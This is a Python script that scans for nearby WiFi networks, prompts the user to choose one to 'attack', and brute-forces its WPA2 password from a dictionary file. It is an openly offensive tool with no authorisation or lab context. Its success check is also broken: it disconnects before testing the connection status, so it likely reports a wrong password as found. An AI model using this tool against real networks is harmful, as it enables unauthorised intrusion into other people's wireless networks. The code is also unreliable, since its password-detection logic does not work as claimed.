import os
import subprocess
import pywifi
from pywifi import const

def scan_wifi_networks():
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
    iface.scan()
    results = iface.scan_results()
    return results

def select_wifi_network(networks):
    print("Available WiFi Networks:")
    for i, network in enumerate(networks):
        print(f"{i + 1}. {network.ssid} (Signal Strength: {network.signal})")
    while True:
        try:
            choice = int(input("Enter the number of the WiFi network you want to attack: "))
            if 1 <= choice <= len(networks):
                return networks[choice - 1]
            else:
                print("Invalid choice. Please enter a valid number.")
        except ValueError:
            print("Invalid input. Please enter a number.")

def dictionary_attack(network, passwords_file):
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
    profile = pywifi.Profile()
    profile.ssid = network.ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    with open(passwords_file, 'r') as f:
        for line in f:
            password = line.strip()
            profile.key = password
            iface.remove_all_network_profiles()
            tmp_profile = iface.add_network_profile(profile)
            iface.connect(tmp_profile)
            iface.disconnect()
            if iface.status() == const.IFACE_DISCONNECTED:
                print(f"Password found: {password}")
                return password
    print("Password not found in the dictionary.")
    return None

if __name__ == "__main__":
    try:
        # Print the current working directory
        print("Current Working Directory:", os.getcwd())

        # Scan for available WiFi networks
        networks = scan_wifi_networks()

        # Select a WiFi network
        selected_network = select_wifi_network(networks)

        # Modify the line to use the full path for passwords_file
        passwords_file = os.path.join(os.getcwd(), "passwords.txt")

        # Perform dictionary attack
        password = dictionary_attack(selected_network, passwords_file)
    except Exception as e:
        print("An error occurred:", str(e))
